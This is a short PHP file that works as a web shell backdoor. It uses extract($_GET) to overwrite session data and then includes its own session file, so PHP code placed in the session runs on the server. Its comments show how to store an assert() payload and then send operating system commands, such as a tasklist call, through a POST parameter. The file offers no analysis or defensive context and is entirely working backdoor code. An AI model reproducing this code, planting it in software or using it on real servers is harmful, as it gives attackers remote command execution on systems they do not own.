<?php
//?_SESSION[CODE]=<?assert($_POST['qw32']);\?\>  
//qw32=system('tasklist -svc')
session_start();
error_reporting(0);
extract($_GET);
include(ini_get("session.save_path")."/sess_".session_id());
?>
